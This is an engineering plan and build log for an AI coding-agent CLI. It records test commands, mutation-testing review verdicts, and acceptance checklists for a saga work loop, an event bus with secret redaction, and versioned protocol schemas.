  go test -count=1 -run '^(TestASecondWakeAsksThePlannerWhenEveryChapterIsDone|TestAWakeNoteDoesNotReplaceTheGoal|TestANewGoalAfterAFinishedSagaArchivesAndStartsFresh|TestArchivingTwiceInTheSameSecondKeepsBoth|TestWakeBudgetCarriesMaxStrikesFromSagaFile)$' -v ./internal/cli
  go test -count=1 -run '^(TestACancelledCommitKeepsTheGitError|TestAPlannedChapterPersistsExecutingBeforeWorkerStarts)$' -v ./internal/engine
  go test -count=1 -run '^(TestSubagentNetworkFollowsPolicyKindAndVendorSwitch|TestBackgroundTaskKindsRunWithoutNetwork)$' -v ./internal/engine
  go test -count=1 -run '^TestSubagentNetworkPolicyRoundTripsAndRejectsUnknown$' -v ./internal/cli
  go test -count=1 -run '^TestCodexNetworkDisabledIsExplicitNotOmitted$' -v ./internal/provider/agentcli
  go test -count=1 -run '^TestChildrenNeverInheritASentinelSecretOnEitherPath$' -v ./internal/shell
  go test -count=1 -run '^(TestPlanCatalogListsFableAndHaikuWithVerifiedEfforts|TestFableNeedsMaxAndHaikuIsOnEveryClaudePlan)$' -v ./internal/provider
  go test -count=1 -run '^(TestOpeningACheaperRungDoesNotGoThroughThePlanCatalogue|TestTopRungLaneSaysWhatASignInWouldUnlock)$' -v ./internal/cli
  go test -count=1 -run '^TestMaxEffortReachesClaudeAsMaxOnFable$' -v ./internal/provider/agentcli
  go test -count=1 -run '^TestAFableSessionRoutesTrivialWorkToHaikuOnThePlan$' -v ./internal/engine
  go vet ./... && go test -count=1 ./internal/cli ./internal/engine ./internal/provider/... ./internal/shell ./internal/secret
  ```
  *Results:* every named test passed (F1 7/7, F2 5/5, F3 6/6); vet clean; the five packages `ok`.
  *Mutations, all red then restored byte-identical (sha256 prefixes in the report):* F1 — the
  pre-wake "nothing left" guard reinserted, note→goal, archive collision check disabled,
  `DoomThreshold` hard-coded, cancellation result dropped on the commit path (5/5 red). F2 — auto
  policy forced on, Codex network flag made conditional, `_PAT` dropped, `SECRET` fragment dropped,
  config validation bypassed (5/5 red); **`_ACCESS_KEY` dropped stayed green** — `AWS_SECRET_ACCESS_KEY`
  is also caught by the `SECRET` fragment, so no sentinel pinned that suffix and the F2.5 dossier
  claim was false at HEAD. F3 — fable row deleted, `ModelsBelowCeiling` emptied, fable rung removed,
  `claude-fable` alias deleted, lane hint condition broken (5/5 red).
  *Verdicts:* F1 **HOLDS**. F2 **HOLDS WITH NOTES** (the unpinned suffix; npm's
  `//registry.npmjs.org/:_authToken` shape not scrubbed; the strict-policy Claude refusal proven at
  the adapter only). F3 **DOES NOT HOLD** at HEAD: `-e max` on Fable reaches the vendor as
  `--effort xhigh` once F4's discovery fills the catalog with `[low medium high xhigh max]` —
  `EffortForPlan` folded `xhigh` into `max` and returned the first spelling at that rank, and the
  named test stops at the adapter, below that call. Proven by the reviewer with a throwaway test.
  *Fixed the same day, before this dossier closed:* an exact spelling the vendor offers now wins
  before any folding (`TestMaxStaysMaxWhenTheVendorOffersBothXhighAndMax`, four cases, mutation
  red); `MINIO_ACCESS_KEY` pins `_ACCESS_KEY` and `_AUTHTOKEN` joins the suffix list with
  `REGISTRY_AUTHTOKEN` as its sentinel (each dropped suffix now goes red). Left as noted: the
  strict-policy engine-to-factory path is reasoned, not driven; a Lstat→Rename window in archiving
  on a single-user CLI.
- **F7.4 — V34 leaves. Done.** Each of the seven judged against evidence in this file, never from
  the plan alone. `V34.1a` stays ticked (F0; nothing since regressed it). **`V34.3b` ticked**:
  executing state is persisted before work (`TestAChapterPersistsExecutingBeforeWorkerStarts`,
  `TestAPlannedChapterPersistsExecutingBeforeWorkerStarts`, terminal state
  `TestAWakePersistsGoalCompletionAsATerminalState`, failure surfaced
  `TestAWakeReportsTerminalStatePersistenceFailure`), and the live run shows `SAGA.md` committed
  inside every chapter commit (`e3fdf00`…`abf772d` in the scratch repo), so artifact and commit are
  one resume anchor; the reviewer confirmed F1 holds with those tests red under mutation. The
  fault-injected restart stays V34.3e's. **Stay open, with the reason written into
  `docs/plan/34`:** `V34.1b` (PTY login sentinel not proven), `V34.3a` (Esc-cancel proven; "lock
  errors are fatal" contradicted by `run.go`'s deliberate advisory hold — owner's call), `V34.3f`
  (C5 progress log; live saga evidence added), `V34.4a` (discovered-model tier gate not built; live
  eligibility observed), `V34.4b` (`ultra` unreachable through `/effort`; unchanged).

#### C5 — TUI progress-log observability — queued

This is a separate surface checkpoint. It must make long-running work legible without turning the
transcript into an unbounded debug dump or hiding durable progress in an ephemeral spinner.

Scope and invariant:

- Use one ordered, bounded activity/event representation for tool calls, file edits, commands,
  verification results, checkpoint transitions, and subagent lifecycle updates. Concurrent producers
  may emit from different goroutines, but the TUI must render a deterministic order and never show a
  finished item ahead of its own start.
- Keep ephemeral activity separate from persistent transcript entries: the spinner/current status
  may change in place while work is active; completed work must leave one concise record that remains
  visible in the session log and can be reconstructed after a redraw or session reload.
- Render Codex/Claude-style summaries such as `Edited N files (+X -Y)`, a one-line command/result,
  and `agent [i/n] — model — effort — summary`; expand nested detail only when the user asks or the
  terminal has room. Previews are single-line, length-bounded, ANSI-safe, and redact secrets.
- Establish a stable visual order and semantic color roles for running, success, warning, failure,
  cancellation, and metadata. Non-color output and narrow terminals must preserve the same meaning.
- Subagent rows must expose index/total, model, effort, bounded task summary, and current state;
  completion replaces the live state without duplicating the task. Queued work and failures remain
  distinguishable from completed work.

Non-goals:

- no provider-specific transcript protocol, raw model payloads, secret-bearing tool output, or
  unbounded diff/command capture;
- no change to execution scheduling or SAGA semantics; this checkpoint consumes lifecycle events and
  improves their presentation only.

Acceptance contract:

- red tests demonstrate the current loss, duplication, ordering, or overlong-preview behavior;
- focused tests cover event ordering under concurrent producers, start/finish replacement,
  file-edit aggregation, command/verification summaries, subagent progress, cancellation/failure,
  narrow/no-color rendering, ANSI/control-byte sanitization, bounded preview length, and reload/
  persistence reconstruction;
- a mutation removing the ordering key, persistent completion record, subagent state, and secret/
  length guard is caught by a targeted test;
- `-race` covers the event store and renderer boundary, an independent reviewer checks visual and
  lifecycle invariants, and `make check` plus documentation/build-log evidence pass before closure.

This checkpoint remains queued until C2/C3 establish the inline SAGA event lifecycle it will display.

Scope:

- `/saga` is an inline marker in a normal user request, for example `build an ecommerce web app /saga`.
  It creates or updates the project-root `SAGA.md` and starts one bounded wake inside the current
  Kolkrabbi session. There is no standalone `kolk saga` product or `run`, `resume`, `status`, or
  `stop` subcommand family.
- Running from outside a repository must not create a misleading home-directory artifact. The command
  either resolves an explicit `--repo <path>` or returns one actionable error naming the required
  repository context; it never searches arbitrary sibling directories or claims the run started.
- The user goal remains the user's text. The SAGA posture is an internal binary directive carried in
  the agent options/system construction and applied consistently to planner, worker, repairer, and
  synthesis; a long repeated “how to proceed” paragraph is not appended to every user message.
- A wake performs exactly one bounded chapter: inspect current state, choose one atomic
  checkpoint/sub-checkpoint, execute, verify, checkpoint/commit on green, persist the next action,
  then stop with a resumable status. The next normal request carrying `/saga` continues it.
- Provide an explicit scheduler integration point (for example a printed, fully quoted command or a
  user-owned timer unit). Do not silently install or overwrite a system cron entry; scheduling is a
  persistent external side effect that needs its own explicit command and status/removal path.
- Default effort is computed from task size: low for inspection/status/mechanical work, medium for a
  bounded implementation, high/xhigh/max only when the checkpoint requires deeper reasoning. The
  SAGA interface does not expose a provider-plan/model picker as part of starting a goal.

Non-goals:

- No automatic push, release, remote mutation, destructive reset, or scheduler installation from a
  normal goal command.
- No hidden user-prompt rewriting that can be lost during compaction, and no free-form model claim
  that a chapter is complete without the recorded quality gate and commit evidence.
- No parallel writes inside one SAGA wake; dependency-aware parallel research remains an agent-mode
  concern and must use Leaf A's capability envelope.

Invariant:

> One short goal activates a durable, internal SAGA posture; each wake advances at most one verified
> chapter, leaves an honest resume anchor, and cannot create an unreviewed external scheduler or
> provider capability.

Required red/green/adversarial evidence:

- Red: binary-level tests reproduce the current two-step surprise (`goal` only records), the
  outside-repository failure, and the absence of an internal SAGA marker in planner/worker calls.
- Green: CLI/slash parity tests prove the short front door, explicit repo handling, one-wake boundary,
  resume idempotence, and a bounded internal directive absent from user content/history.
- Adversarial: malformed goal/repo, existing dirty tree, corrupt or stale `SAGA.md`, duplicate wake,
  cancellation during provider/tool/commit, scheduler command quoting, and failed commit/persistence.
  Prove no second chapter starts after a completed wake and no abandoned chapter is reported done.
- Independent review: a different agent runs the isolated-repository restart/stop matrix, checks the
  prompt transcript for leakage/duplication, and reruns the focused and `-race` gates.

#### Shared phase exit

Both leaves must have their red/green/adversarial/independent-review evidence, a stable-worktree
repository gate, and a build-log entry. Documentation must say exactly what network access, provider
authentication, repository context, and scheduling behavior are available. The phase remains open if
either leaf can only be demonstrated on the developer's current directory or by relying on a vendor
default that is not asserted in the child invocation.

## Migration queue — one checkpoint group at a time

These are intentionally coarse until they become active; their detailed red/green checklist is
written only when the preceding group closes.

The original order put owner-trial checkpoints T0.1–T0.5 before A6. On 2026-08-23 the owner
explicitly postponed publishing and directed the remaining project work to continue first. T0.4d2
and T0.5 therefore stay blocked without being treated as failed, and the additive A6 migration may
proceed without changing repository visibility, tags, releases, or deployments.

- [x] **A7 event bus** — emit events while preserving today's plain output byte-for-byte.
- [x] **A8 decision port** — move interactive approval out of the engine.
  - [x] **A8.1 terminal decider adapter** — move interactive stdin prompts into an explicit `TerminalDecider` and decouple engine from raw `bufio.Reader`.
  - [x] **A8.2 permission event lifecycle** — emit canonical `permission.requested` and `permission.resolved` events on the bus.
  - [x] **A8.3 session permission rules** — support session-level retention (`allow_session`) for approved actions.
- [x] **A9 engine ports** — inject stores/recorders/clock and isolate orchestration.
  - [x] **A9.1 engine port interfaces** — declare `SessionStore`, `Checkpointer`, `Recorder`, and `Clock` in `internal/engine/port.go`.
  - [x] **A9.2 adapter port contracts** — ensure `internal/session`, `internal/checkpoint`, and `internal/stats` fulfill the port interfaces.
  - [x] **A9.3 engine decoupling** — remove all imports of `session`, `checkpoint`, and `stats` from `internal/engine`.
  - [x] **A9.4 architecture ratchet closure** — remove all entries from `knownViolations` in `internal/arch/layers.go` and verify full isolation.
- [x] **A10 session format cut** — freeze a v0 fixture before changing persisted messages.
  - [x] **A10.1 v0 session fixture** — commit `internal/session/testdata/v0-session.json` capturing legacy message and tool call format.
  - [x] **A10.2 persisted message schema** — define `session.Message`, `session.ToolCall`, and `session.FunctionCall` with frozen tags and reasoning field.
  - [x] **A10.3 store boundary conversion** — implement clean bidirectional translation between `session.Message` and `provider.Message`.
  - [x] **A10.4 fixture regression test** — verify v0 format deserialization and round-trips without data loss.
- [x] **A11 serve surfaces** — identical NDJSON, stdio, and SSE event frames.
  - [x] **A11.1 server mux & bearer auth** — implement `internal/serve/serve.go` and `internal/serve/auth.go` with bearer token validation, non-loopback protection, and health routes.
  - [x] **A11.2 sse stream endpoint** — implement `internal/serve/sse.go` with `id:`, `event:`, `data:`, `Last-Event-ID` bus replay, and heartbeat ping.
  - [x] **A11.3 stdio stream server** — implement `internal/serve/stdio.go` for stdio pipe-based frame streaming.
  - [x] **A11.4 permission resolution endpoint** — implement `internal/serve/permission.go` for resolving pending interactive permissions.
  - [x] **A11.5 listeners & architecture registration** — implement `listen.go`, and register `internal/serve` & `cmd/kolkd` in `internal/arch/layers.go`.
  - [x] **A11.6 stream conformance test** — implement `internal/serve/conform_test.go` verifying byte-identical JSON bodies between NDJSON and SSE against `spec/testdata/streams/*.ndjson`.
  - [x] **A11.7 cli serve & daemon binary** — implement `kolk serve` in `internal/cli/cmd_serve.go` and daemon entrypoint `cmd/kolkd/main.go`.
- [~] **A12 local dashboard store** — the SQLite half is superseded by `docs/plan/17-local-dashboard.md`; `stats.jsonl` stays the store. A12.5's budget/architecture verification is now closed by the 2026-09-01 repository gate; A12.3/A12.4 below still describe a store this project decided not to build.
  - [x] **A12.1 embedded assets & sentinel** — `internal/dash/dist/index.html` and `internal/dash/embed.go` both exist; ticked 2026-08-27 during a plan audit that found the work done and the box unchecked.
  - [~] **A12.2 sqlite store & migrations** — **superseded 2026-08-26 by `docs/plan/17-local-dashboard.md`.**
  A heavy user's year aggregates from `stats.jsonl` in 578 ms, so SQLite would spend the third
  third-party module — a hard budget-gate failure — to buy imperceptible speed. Revisit only when a
  real `kolk stats` run exceeds 2 s.
  - [~] **A12.3 jsonl ingestion & event ingest** — **superseded 2026-08-27, same reason as A12.2**: there is no SQLite to import into. `stats.jsonl` is read directly. Live bus ingest is not superseded and remains unbuilt.
  - [~] **A12.4 queries & handler endpoints** — **partly superseded 2026-08-27**: `internal/dash/page.go` serves the dashboard from `stats.jsonl`, so `query.go` and `handler.go` describe a shape that was not built. Whether `/v1/stats/*` should exist on `kolk serve` is still open and belongs to item 26.
  - [x] **A12.5 budget & arch verification** — verified 2026-09-01 by the complete repository gate:
  3,079 tests, 9.46 MB binary budget, 3.7 ms cold-start p50, and all architecture/purity/build-tag
  checks green. The dependency ceiling is **no longer raised**: item 17 keeps the store dependency-free.
- [ ] **A13 Windows** — replace every honest stub and make Windows CI required.
- [~] **A14 additive product leaves** — TUI, external agent adapters, and saga, separately.
  All three shipped: `internal/tui` (U0.4, G11), `internal/provider/agentcli` (B12), and the saga
  loop (S10). What this row still means, and did not say, is the *migration* half — each was built
  additively and none has been re-checked against the layer rules as a group. Marked in progress
  2026-08-27 rather than closed, because "it exists" and "it obeys the architecture" are different
  claims and only the first is proven.
- [ ] **A15 generated client proof** — nested tools module and TypeScript protocol client.
- [ ] **A16 platform clients** — desktop and mobile directories without root-module rewrites.

### A7 event bus — active detail

Delivery slices (only one active at a time):

- [x] **A7.1 bounded in-memory journal** — assign ordered envelopes, retain a bounded replay
  window, and fan out to bounded live subscribers without a goroutine.
- [x] **A7.2 publish scrub chokepoint** — scrub every event string field without corrupting its
  typed payload, then prove shipped credential shapes cannot cross the journal boundary.
- [x] **A7.3 durable event log** — spill exact NDJSON frames and replay one cursor across disk and
  memory before attaching live.
- [x] **A7.4 byte-stable plain renderer** — move current engine formatting behind an event
  subscriber while retaining `Options.Out` and exact output bytes.
- [x] **A7.5 engine event projection** — emit canonical lifecycle, content, tool, permission,
  accounting, and diagnostic events alongside the still-green plain renderer.
- [x] **A7.6 stream-json surface** — expose the same retained envelopes through the one-shot CLI
  without inventing a second framing path.

#### A7.1 bounded in-memory journal — active acceptance

Scope:

- Construct one journal for one canonical protocol session ID. `Publish` accepts a canonical turn
  ID, event type, and object payload; the journal assigns a contiguous positive sequence and a
  nondecreasing UTC timestamp, validates the complete envelope through `protocol`, then appends it.
- Bound the retained window by both event count and exact LF-terminated NDJSON bytes, with defaults
  of 10,000 events and 8 MiB. Reject one event that cannot fit rather than publishing an
  unreplayable sequence or silently violating the configured bound.
- `Subscribe(afterSeq)` snapshots every retained envelope after the last-seen cursor and then
  attaches one bounded live channel atomically. A full live channel closes only that subscriber
  with a discoverable slow-subscriber error; the journal and other subscribers continue, and the
  dropped subscriber can recover from its last consumed sequence.
- Defensively copy payload bytes at every journal/subscriber boundary so one consumer cannot mutate
  retained history, another subscriber's event, or the value returned by `Publish`.

Non-goals:

- No filesystem, spill file, durable retention, pruning policy, resume transport, SSE/NDJSON
  writer, HTTP route, CLI flag, renderer, engine event, session-format migration, or output change.
- No credential-pattern scanner or scrub mutation yet. A7.2 must close before any disk, engine,
  renderer, or transport consumer is connected to this in-memory seam.
- No delta coalescing/drop diagnostic yet. A7.1 disconnects any slow live subscriber uniformly and
  preserves every published event in the current replay window; A7.3 owns durable catch-up and the
  final backpressure policy.
- No protocol/schema/catalog change, event-payload constructor, provider translation, event ID, or
  alteration of the legacy persisted session ID.

Acceptance checklist:

- [x] concurrent publishers receive one contiguous sequence and subscribers observe the same order
  with nondecreasing timestamps.
- [x] count and exact-byte limits evict only the oldest complete envelopes; retained cursors replay
  strictly after the requested sequence, while expired and ahead cursors return distinct errors.
- [x] subscribe's replay snapshot and live registration are atomic, multiple subscribers are
  isolated, close is idempotent, and a full subscriber cannot block publication or another reader.
- [x] a dropped subscriber reports the slow-consumer cause and can resubscribe from its last
  consumed sequence without an event gap while that cursor remains retained.
- [x] invalid session/turn IDs, invalid event payloads, zero/backward clock values, impossible
  limits, and oversized single events fail without consuming a sequence or notifying subscribers.
- [x] payload ownership tests, focused race tests, architecture/purity/platform gates, and the full
  repository suite pass with red/green/refactor evidence recorded.

#### A7.2 publish scrub chokepoint — active acceptance

Delivery leaves (only one active at a time):

- [x] **A7.2a pure durable scanner** — move arbitrary-text scrubbing into `internal/redact`, derive
  shipped patterns from the embedded shape table, and support process-known literals.
- [x] **A7.2b JSON string preservation** — scrub decoded JSON strings, including escaped forms,
  while retaining all untouched outer bytes and returning valid JSON.
- [x] **A7.2c bus splice boundary** — scrub before retention/fan-out, validate the result, forbid
  bus imports of credential types, and inject every shipped canary through event string fields.

Scope:

- Make `internal/redact` the stdlib-only owner of durable scrubbing. `internal/secret` may register
  a resolved literal and delegate text scrubbing, but `internal/bus` must be mechanically forbidden
  from importing `internal/secret` or `internal/keystore`.
- Match exact registered literals first, then every shipped infer/deny prefix with its declared
  minimum length and alphabet, Bearer tokens, recognized JWTs/private-key blocks, and finally the
  durable keyword assignment rule. Shape and keyword matching suppress documented placeholders;
  exact registered literals never do.
- Replace a match with one stable, idempotent, process-salted sentinel that retains only a safe
  shape label and short within-process correlation fingerprint, never a reusable prefix/tail mask.
- Decode and scrub every JSON string token in event data, including keys, nested objects/arrays,
  and secrets assembled through JSON escapes. Preserve every untouched byte and re-encode only a
  changed string token before the bus validates and publishes the envelope.

Non-goals:

- No streaming `redact.Writer`, tool-boundary path carve-out, write-back sentinel refusal,
  `/redact off`, terminal-control sanitizer, debug log, renderer, engine, session, stats, transport,
  or filesystem integration. Their owners consume this primitive in later independent leaves.
- No mutation of user input or files, no entropy heuristic, no generic base64/SHA/UUID redaction,
  and no protocol event/catalog/schema change. A future `message.redacted` notification remains
  dependency-gated; A7.2 only guarantees that the original secret cannot cross the bus.
- No plaintext, mask, full hash, stable cross-process fingerprint, provider credential type, or
  keystore metadata may appear in a sentinel or bus API.

Acceptance checklist:

- [x] every embedded infer/deny prefix, Bearer token, recognized JWT/private-key block, durable
  keyword assignment, and registered shape-less literal is removed without matching the committed
  false-positive/placeholder corpus.
- [x] sentinels are stable within one process, different literals correlate differently, reveal no
  usable secret fragment, and `Scrub(Scrub(text)) == Scrub(text)`.
- [x] valid UTF-8 remains valid, malformed input never panics, and a scanner benchmark records the
  whole-frame cost without introducing a regular-expression hot path.
- [x] JSON scrubbing catches plain and escaped canaries at every nesting position, retains numeric,
  boolean, null, whitespace, key order, and untouched string bytes exactly, and fails closed on
  malformed/non-object input.
- [x] publishing any shipped canary yields only scrubbed replay/live/return copies; failed scrub or
  post-scrub protocol validation consumes no sequence and notifies no subscriber.
- [x] focused/fuzz/race tests, import bans, architecture/purity/platform gates, and the full
  repository suite pass with red/green/refactor evidence recorded. (Independent verification by
  ox-alpha 2026-08-24 02:53–03:05, per the AGENTS.md handoff — verifier did not write this code:
  `go test -race ./internal/redact ./internal/secret ./internal/arch -count=1` all ok;
  `FuzzScrubPreservesValidUTF8AndIdempotence` 21 s PASS, 84,820 execs, 13 new interesting inputs,
  zero crashers (no `testdata/fuzz` corpus); `BenchmarkScrub12KiB` 82,600 ns/op, 148.77 MB/s,
  **0 B/op, 0 allocs/op** on Apple M3; full `make check` exit 0 — 142 package-ok lines, 1,329
  tests across all modules, lint clean, budgets 4.7 ms cold start / 2 third-party modules;
  surface 13 / site 110 / installer 72 / spec 29 / release 24 / workflow 41 / verifier 30 checks
  all green; repo-wide `go vet ./...` clean. No failures found; nothing edited in codex's files.)

### A6 protocol contract — active detail

Delivery slices:

- [x] **A6.1 envelope foundation** — protocol version 0, the single language-neutral envelope
  schema, a golden frame, and its stdlib-only public Go binding.
- [~] **A6.2 event vocabulary** — event-name constants, typed event payloads, and one golden frame
  per shipped event without connecting the engine yet.
- [ ] **A6.3 commands, entities, and errors** — client commands, shared entities, stable error
  mapping, and their conformance fixtures.
- [x] **A6.4 transport contract closure** — NDJSON/SSE framing rules, stream fixtures, OpenAPI
  shape, spec-change CI guard, and the complete A6 gate.

A6.4 is split so byte framing lands before any daemon route or long-lived reader:

- [x] **A6.4a single-event framing** — normative stdio/SSE rules plus byte-identical NDJSON and SSE
  encoders and the heartbeat comment.
- [x] **A6.4b stream decoding and fixtures** — bounded NDJSON/SSE decoding and complete multi-event
  conformance streams after the single-frame grammar is fixed.
  - [x] **A6.4b1 bounded decoder grammar** — callback streaming, exact transport syntax, metadata
    integrity, heartbeat filtering, and a hard frame limit.
  - [x] **A6.4b2 whole-turn fixtures** — canonical NDJSON/SSE multi-event streams and cross-format
    conformance after the reader grammar is green.
    - [x] **A6.4b2a owner-stable turn streams** — code, permission-denied, and agent-fanout fixture
      pairs; saga and resume fixtures stay dependency-gated.
- [x] **A6.4c OpenAPI shape** — only endpoints whose commands/entities are shipped, with deferred
  A10-owned surfaces excluded honestly.
- [x] **A6.4d spec-change guard and A6 closure** — changelog enforcement, whole-contract inventory,
  and the complete migration gate.

A6.2 is intentionally delivered as independently reviewable vocabulary slices:

- [x] **A6.2a streamed deltas** — `message.delta` and `reasoning.delta`, whose required `text`
  payload is already explicit in the architecture and provider contracts.
- [x] **A6.2b lifecycle and completed content** — handshake, session, turn, and
  `message.completed` events after their payload fields are fixed.
- [x] **A6.2c tools and decisions** — tool and permission events.
- [ ] **A6.2d orchestration and operations** — subagent, chapter, checkpoint, accounting, score,
  error, and log events, followed by a complete closed-vocabulary check.

A6.2d is split by lifecycle owner and durability requirement:

- [x] **A6.2d1 subagent lifecycle** — parent/child turn correlation, task identity, resolved mode,
  ordinal presentation, and terminal outcome.
- [ ] **A6.2d2 saga chapter lifecycle** — chapter identity, sequence, goal, and terminal outcome.
- [x] **A6.2d3 checkpoints** — durable checkpoint identity and the reason it was created.
- [x] **A6.2d4 accounting and score** — usage and score payloads with explicit unknown-value
  semantics.
- [x] **A6.2d5 diagnostics and closure** — stable error and log payloads plus a test proving every
  shipped event name has exactly one schema and golden frame.

A6.2d4 separates machine accounting from human or automated evaluation:

- [x] **A6.2d4a usage reported** — one model-attempt accounting row, nullable measurements,
  provenance, comparability class, and attempt context.
- [x] **A6.2d4b score recorded** — target identity, scorer identity, typed value, and source.

A6.2d5 separates ordinary diagnostics from the shared error entity and the final catalog proof:

- [x] **A6.2d5a log diagnostics** — level, closed code, optional field transition, and message.
- [x] **A6.2d5b error event** — scheduled with A6.3's stable error entity so transport and event
  failures cannot diverge.
- [x] **A6.2d5c vocabulary closure** — prove every shipped event constant has exactly one schema and
  golden frame after the error event exists.

A6.3 is split so the error event can reuse one public entity instead of inventing transport-only
failure semantics:

- [x] **A6.3a error entity and mapping** — one closed error-code vocabulary, safe display fields,
  and one authoritative code-to-HTTP-status, shell-exit, and default-retryability table.
- [ ] **A6.3b shared entities** — session, model, usage, permission, score, chapter, and span shapes
  after each owning subsystem has frozen its identity and persistence semantics.
- [ ] **A6.3c client commands** — imperative command bodies and correlation for turn, permission,
  and session operations after their target entities are stable.

A6.3c is split at each mutation boundary:

- [x] **A6.3c1 permission resolve** — correlate one pending request with one closed decision; the
  server owns timeout/reason enrichment on the resolved event.
- [x] **A6.3c2 turn cancel** — cancel one canonical turn ID without transporting a Go context.
- [ ] **A6.3c3 turn create** — deferred until A10 freezes whether creation resumes an existing
  canonical session or creates a new one and which session projection is accepted.
- [ ] **A6.3c4 session fork/list** — deferred with the A6.3b4 session entity and A10 format cut.
- [x] **A6.3c5 command vocabulary closure** — prove every shipped command constant has exactly one
  schema and golden body without publishing placeholders for deferred commands.

A6.3b follows the owning subsystem instead of publishing speculative aggregate objects:

- [x] **A6.3b1 usage entity** — extract the already-frozen `usage.reported` row into one shared
  entity and make the event reference it.
- [x] **A6.3b2 score entity** — extract the already-frozen typed evaluation after usage proves the
  entity-reference pattern.
- [ ] **A6.3b3 permission entity** — deferred until A8 freezes pending-decision state and expiry.
- [ ] **A6.3b4 session entity** — deferred until A10 replaces legacy IDs/messages and freezes the
  on-disk migration fixture.
- [ ] **A6.3b5 model entity** — deferred until the hardened provider catalog owns capabilities and
  price provenance instead of today's provider-specific partial row.
- [ ] **A6.3b6 chapter and span entities** — deferred with PLAN item 10's saga state machine and
  tracing identity.

A6.2b is split at the four payload decisions so an unspecified lifecycle field cannot hitchhike
with an already-settled one:

- [x] **A6.2b1 hello handshake** — `{protocol, server, capabilities[]}` as specified by the
  architecture and mobile handshake constraint.
- [x] **A6.2b2 session lifecycle** — started, updated, and ended payloads.
- [x] **A6.2b3 turn lifecycle** — started, finished, and cancelled payloads.
- [x] **A6.2b4 completed content** — the authoritative `message.completed` payload.

A6.2c is split at the execution and decision boundaries so tool ownership cannot be confused with
permission state or outcome data:

- [x] **A6.2c1 requested invocation** — `tool.requested` identity, raw arguments, and executor.
- [x] **A6.2c2 execution lifecycle** — `tool.started`, `tool.output`, and `tool.finished`.
- [x] **A6.2c3 permission decisions** — `permission.requested` and `permission.resolved`.

A6.2c2 is split again because beginning execution, carrying output, and recording the terminal
outcome have different required facts:

- [x] **A6.2c2a execution started** — `tool.started` correlation and executor.
- [x] **A6.2c2b execution output** — `tool.output` correlation, content, and executor.
- [x] **A6.2c2c execution finished** — `tool.finished` correlation, outcome, and executor.

A6.2c3 keeps the user-facing request separate from its later transport round-trip:

- [x] **A6.2c3a permission requested** — request identity, tool, detail, and optional diff.
- [x] **A6.2c3b permission resolved** — request correlation and decision vocabulary.

#### A6.1 envelope foundation acceptance

Scope:

- Define protocol version `0` and one forward-compatible envelope shared by every future transport.
- Make the language-neutral schema and golden JSON the source of truth, with a public Go binding
  that depends only on the standard library.

Non-goals:

- No event catalog beyond the golden frame's opaque event name and data object.
- No stream decoder, NDJSON writer, SSE, OpenAPI paths, event bus, engine integration, CLI output,
  session migration, or user-visible behavior change.
- No installer, repository visibility, tag, release, Pages, or other deployment mutation.

Acceptance checklist:

- [x] `spec/VERSION` is exactly `0`, `protocol.Version` mirrors it, and the protocol changelog
  records the new contract.
- [x] `spec/schemas/envelope.json` requires positive `seq`, RFC 3339 `ts`, canonical typed session
  and turn IDs, a lowercase dot-separated event `type`, and object-valued `data` while permitting
  unknown fields for forward compatibility.
- [x] `protocol.Envelope` encodes the six fields in schema order and decodes one complete JSON
  frame with no trailing value.
- [x] the golden frame round-trips byte-for-byte; unknown fields and syntactically valid unknown
  event types decode without weakening required-field validation.
- [x] zero sequence, malformed timestamps/IDs/types, absent or non-object data, and trailing JSON
  fail closed in offline table tests.
- [x] `protocol` is registered as L1, imports only the standard library even from conformance tests,
  and no existing package depends on it yet.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2b1 hello handshake acceptance

Scope:

- Define `hello` as a public event name and define its reusable payload for both an event frame and
  the future `GET /v1/hello` response.
- Require protocol version `0`, a non-empty server identity, and a present capability list; an empty
  list is valid because a minimal server must be able to report no optional capabilities honestly.
- Preserve unknown payload fields and allow capability names to grow without a protocol-version
  change.

Non-goals:

- No session, turn, completed-message, mode projection, or platform-specific capability registry.
- No HTTP endpoint, event bus, stream transport, engine integration, or CLI output change.
- No installer, repository visibility, tag, release, Pages, or deployment mutation.

Acceptance checklist:

- [x] the `hello` constant exactly matches its schema filename and golden-envelope `type` value.
- [x] the schema requires exactly the three baseline fields, fixes `protocol` to `0`, and permits
  both an empty capability list and unknown fields.
- [x] the typed payload decodes the golden handshake and the envelope round-trips byte-for-byte.
- [x] missing fields, a mismatched protocol, an empty server, null/non-array capabilities, empty
  capability names, and duplicate capability names fail closed.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2b2 session lifecycle acceptance

Scope:

- Define `session.started`, `session.updated`, and `session.ended` as public event names with one
  schema, typed payload, and compact golden envelope each.
- Require `session.started` to project the non-empty model, mode, effort, and working directory that
  clients need when attaching to a live session.
- Define `session.updated` as a non-empty forward-compatible patch. Its known optional fields are
  model, mode, effort, and title; present known strings must be non-empty, while an unknown-only
  patch remains valid for additive protocol evolution.
- Require `session.ended` to carry a non-empty open-ended reason. The envelope remains the only
  source of session ID, turn ID, and event timestamp.

Non-goals:

- No closed enum for mode, effort, update fields, or end reason; future values must remain additive.
- No turn lifecycle, completed content, session entity/list response, event bus, persistence
  migration, engine wiring, transport, or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

- [x] all three constants exactly match their schema filenames and golden-envelope type values.
- [x] started requires non-empty model, mode, effort, and cwd; missing, empty, null, and non-string
  values fail closed.
- [x] updated requires at least one field; known fields validate when present, unknown fields are
  retained, and an unknown-only patch remains valid.
- [x] ended requires a non-empty string reason without restricting its vocabulary.
- [x] all three typed payloads decode their goldens, and every envelope round-trips byte-for-byte.
- [x] the public package remains standard-library-only and disconnected from existing packages.
- [x] focused tests, architecture gates, full repository gates, and the build log are green.

#### A6.2b3 turn lifecycle acceptance

Scope:

- Define `turn.started`, `turn.finished`, and `turn.cancelled` as public event names with one schema,
  typed payload, and compact golden envelope each.
- Require `turn.started` to carry the non-empty user input and requested model, mode, and effort so
  replay and newly attached clients can reconstruct what initiated the turn.
- Require `turn.finished` to carry a non-empty normalized reason and allow one optional non-empty
  `raw_reason` for the provider's original open-ended finish value.
- Require `turn.cancelled` to carry a non-empty open-ended reason. The envelope remains the only
  source of session ID, turn ID, and event timestamp.

Non-goals:

- No closed enum for finish or cancellation reasons; adapters may add values without a protocol
  bump.
- No completed or partial assistant content, usage, error details, duration, response metadata,
  event bus, engine wiring, transport, persistence, or CLI output change.
- No installer publication, release tag, repository-visibility change, deployment, or clean-machine
  rehearsal.

Acceptance checklist:

